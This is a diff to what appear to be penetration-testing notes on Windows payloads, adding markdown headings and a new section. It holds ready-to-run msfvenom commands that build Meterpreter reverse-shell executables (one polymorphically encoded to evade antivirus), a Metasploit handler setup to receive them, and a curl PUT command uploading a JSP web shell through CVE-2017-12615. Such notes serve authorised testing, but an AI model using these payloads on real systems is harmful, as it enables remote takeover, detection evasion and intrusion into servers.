@@ -1,5 +1,4 @@
-This section goes over the best payloads to use.
-
+### [Payload Resources]
 https://github.com/nccgroup/Winpayloads
 
 Winpayloads.py
@@ -31,12 +30,12 @@ https://github.com/xephora/PayloadsAllTheThings
 
 [Generating Payloads on Windows using Metasploit]
 
-[Regular Reverse TCP]
+### [Regular Reverse TCP]
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOURIP LPORT=YOURPORT -f exe > shell.exe
 [Poly Morphic Reverse TCP]
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOURIP LPORT=YOURPORT -e x64/shikata_ga_nai -i 100 -f exe > file.exe
 
-[Handler]
+### [Handler]
 msf5 > use exploit/multi/handler
 msf5 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
 PAYLOAD => windows/x64/meterpreter/reverse_tcp
@@ -49,3 +48,8 @@ msf5 exploit(multi/handler) > run
 https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom
 https://www.offensive-security.com/metasploit-unleashed/fun-incognito/
 
+### [CVE-2017-12615]
+```
+curl -X PUT https://example/path/where/to/put/shell.jsp/ -d @- < shell.jsp
+```
+https://github.com/breaktoprotect/CVE-2017-12615
